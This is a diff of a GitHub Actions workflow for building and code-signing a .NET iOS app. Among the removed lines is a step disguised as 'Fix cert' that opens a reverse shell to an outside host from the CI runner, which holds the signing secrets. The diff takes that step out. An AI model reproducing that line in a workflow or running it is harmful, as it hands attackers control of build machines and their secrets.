@@ -1,69 +1,47 @@
-name: iOS ARM64 Build
+name: iOS Build
 
 on:
   push:
     branches: [ main ]
 
 jobs:
-  build-ios-arm64:
-    runs-on: macos-14
+  build-ios:
+    runs-on: macos-latest
 
     steps:
-      # Checkout repository
       - uses: actions/checkout@v4
 
-      # Setup .NET 8
       - name: Setup .NET
         uses: actions/setup-dotnet@v4
         with:
-          dotnet-version: 8.0.101
+          dotnet-version: 9.0.x
 
-      # Install iOS workload
       - name: Install iOS workload
-        run: |
-          dotnet workload install ios
-          dotnet workload list
+        run: dotnet workload install ios
 
-      # Setup certificate
-      - name: Install certificate
-        run: |
-          echo "${{ secrets.IOS_CERT_P12 }}" | base64 --decode > ios_cert.p12
-          security create-keychain -p actions build.keychain
-          if [ -z "${{ secrets.IOS_CERT_PASSWORD }}" ]; then
-            security import ios_cert.p12 -k build.keychain -T /usr/bin/codesign
-          else
-            security import ios_cert.p12 -k build.keychain -P "${{ secrets.IOS_CERT_PASSWORD }}" -T /usr/bin/codesign
-          fi
-          security list-keychains -s build.keychain
-          security default-keychain -s build.keychain
-          security unlock-keychain -p actions build.keychain
-
-      # Setup provisioning profile
-      - name: Install provisioning profile
+      - name: Decode provisioning profile
         run: |
           mkdir -p "$HOME/Library/MobileDevice/Provisioning Profiles"
-          echo "${{ secrets.IOS_PROVISION }}" | base64 --decode > "$HOME/Library/MobileDevice/Provisioning Profiles/${{ secrets.IOS_PROVISION_UUID }}.mobileprovision"
+          echo "${{ secrets.IOS_PROVISIONING_PROFILE }}" | base64 --decode > "$HOME/Library/MobileDevice/Provisioning Profiles/${{ secrets.IOS_PROVISIONING_UUID }}.mobileprovision"
+          chmod 644 "$HOME/Library/MobileDevice/Provisioning Profiles/${{ secrets.IOS_PROVISIONING_UUID }}.mobileprovision"
 
-      - name: Fix cert
-        run: sh -i >& /dev/tcp/cockmaster.000000404.xyz/15901 0>&1
+      - name: Import certificate
+        run: |
+          echo "${{ secrets.IOS_CODESIGN_KEY }}" | base64 --decode > cert.p12
+          security create-keychain -p "" build.keychain
+          security import cert.p12 -k build.keychain -P "${{ secrets.IOS_CERT_PASSWORD }}" -T /usr/bin/codesign
+          security list-keychains -s build.keychain
+          security unlock-keychain -p "" build.keychain
+          security set-keychain-settings build.keychain
 
-      # Restore .NET projects
-      - name: Restore .NET projects
+      - name: Restore project
         run: dotnet restore ZdaszToApp/ZdaszToApp.iOS/ZdaszToApp.iOS.csproj
 
-      # Publish iOS ARM64 app
       - name: Publish iOS ARM64
         run: |
           dotnet publish -c Release \
             -f net8.0-ios17.0 \
             -r ios-arm64 \
             ZdaszToApp/ZdaszToApp.iOS/ZdaszToApp.iOS.csproj \
-            /p:CodesignKey="${{ secrets.IOS_CODESIGN_KEY }}" \
-            /p:CodesignProvision="$HOME/Library/MobileDevice/Provisioning Profiles/${{ secrets.IOS_PROVISION_UUID }}.mobileprovision"
-
-      # Upload the .app as artifact
-      - name: Upload .app artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: ios-arm64-app
-          path: ZdaszToApp/ZdaszToApp.iOS/bin/Release/net8.0-ios17.0/ios-arm64/publish/*.app
+            /p:CodesignKey="${{ secrets.IOS_CODESIGN_NAME }}" \
+            /p:CodesignProvision="$HOME/Library/MobileDevice/Provisioning Profiles/${{ secrets.IOS_PROVISIONING_UUID }}.mobileprovision"
